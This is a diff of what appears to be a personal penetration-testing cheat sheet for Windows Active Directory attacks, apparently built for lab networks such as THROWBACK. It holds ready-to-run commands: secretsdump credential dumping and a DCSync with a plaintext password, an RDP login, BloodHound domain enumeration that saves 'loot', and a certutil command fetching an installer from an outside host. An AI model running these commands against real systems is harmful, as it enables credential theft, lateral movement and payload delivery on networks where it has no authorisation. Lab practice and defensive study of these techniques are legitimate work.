@@ -94,6 +94,11 @@ https://github.com/opsxcq/exploit-CVE-2014-6271
 [windows:secretsdump]
 secretsdump.py -sam SAM -system SYSTEM LOCAL
 secretsdump.py -just-dc hololive.local/DC01\$@10.10.225.71
+# DCSync
+secretsdump.py THROWBACK.local/jeffersd:Throwback2020@10.200.3.117 -dc-ip 10.200.3.117
+
+[xfreerdp]
+xfreerdp /v:10.10.10.10 /u:admin /p:password
 
 [certuril]
 certutil -URLCache -f http://10.8.2.121:9005/setup.msi  c:\Temp\setup.msi
@@ -467,3 +472,10 @@ public class testprog {
     }
 }
 ```
+
+[BloodHound]
+* upload SharpHound.ps1
+* getting the loot
+Invoke-Bloodhound -CollectionMethod All -Domain THROWBACK.local -ZipFileName loot.zip 
+* start the server
+neo4j:root
